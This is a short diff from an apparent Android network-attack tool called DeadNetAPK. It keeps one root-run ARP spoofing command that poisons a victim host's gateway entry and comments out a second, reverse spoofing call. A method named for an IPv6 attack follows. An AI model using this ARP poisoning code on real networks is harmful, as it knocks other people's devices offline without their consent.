@@ -135,9 +135,9 @@ class DeadNetAPK:
         subprocess.Popen(
             f"su -c {self.arp_path} {self._network_interface} {host_ip} {generate_random_mac()} {self._gateway_ipv4} {self._gateway_mac} {self._my_mac}",
             shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-        subprocess.Popen(
-            f"su -c {self.arp_path} {self._network_interface} {self._gateway_ipv4} {self._gateway_mac_fake} {host_ip} ff:ff:ff:ff:ff:ff {self._my_mac}",
-            shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        # subprocess.Popen(
+        #     f"su -c {self.arp_path} {self._network_interface} {self._gateway_ipv4} {self._gateway_mac_fake} {host_ip} ff:ff:ff:ff:ff:ff {self._my_mac}",
+        #     shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
 
     def _do_ipv6_attack(self) -> None:
         """
